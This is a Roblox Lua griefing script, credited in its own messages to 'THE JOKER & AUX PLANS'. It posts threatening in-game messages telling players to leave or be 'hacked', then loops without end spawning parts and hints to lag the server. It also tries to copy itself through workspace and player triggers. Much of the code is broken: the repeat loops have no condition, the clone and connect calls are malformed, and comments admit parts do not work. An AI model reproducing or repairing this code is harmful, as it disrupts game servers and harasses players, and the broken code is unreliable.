local foldername = "JOKER"

--Warning texts (edit if you want)

local a = Instance.new("Hint")
a.Parent = game.Workspace
a.Text = "THE JOKER & AUX PLANS PRESENTS"
wait(5)

local h = Instance.new("Message")
h.Parent = game.Workspace
h.Text = "WARNING!!"
wait(5)
h:Remove()

local g = Instance.new("Message")
g.Parent = game.Workspace
g.Text = "R&J WAS HERE!!"
wait(5)
g:Remove()

local i = Instance.new("Message")
i.Parent = game.Workspace
i.Text = "''''RoJack''''"
wait(5)
i:Remove()

local j = Instance.new("Message")
j.Parent = game.Workspace
j.Text = "GET OUT RIGHT NOW OR ELSE THE JOKER & AUX PLANS WILL HACK YOU AND FUCK YOU!!!!"
wait(5)
j:Remove()
a:Remove()

local k = Instance.new("Message")
k.Parent = game.Workspace
k.Text = "3!!!!!"
wait(1)
k:Remove()

local k = Instance.new("Message")
k.Parent = game.Workspace
k.Text = "2!!!!!"
wait(1)
k:Remove()

local k = Instance.new("Message")
k.Parent = game.Workspace
k.Text = "1!!!!!"
wait(1)
k:Remove()

--an folder creator (not works but adds more weight to te script to an little more lag , and help me)

wait(3)
function newFolder()
	local Folder = Instance.new("Folder",workspace)
	Folder.Name = foldername
end

--the parts creator (VERY IMPORTANT)

repeat
	Instance.new("Part", game.Workspace)
	Instance.new("Part", game.Workspace)
	Instance.new("Part", game.Workspace)
	
	local w = Instance.new("Hint", game.Workspace)
	w.Text = math.random(1,90000)
	
	wait()
until

--an console message and warn (edit this)

print("R&J WAS HERE!")
warn("PLEASE EXIT OR THE JOKER WILL HACK YOU NOW!!!!")

--an cloner and the folder creator (not works)

repeat
	game.Workspace.Antivirus:Clone(script)
	do newFolder()
	end
until

--an message (console)

print("BY-THE-JOKER")

--the triggers (not works and help me)

game.Workspace.ChildAdded:Connect(script:Clone())
game.Workspace.ChildAdded:Connect(Instance.new("Part"), game.Workspace)
game.Players.ChildAdded:Connect(script:Clone())
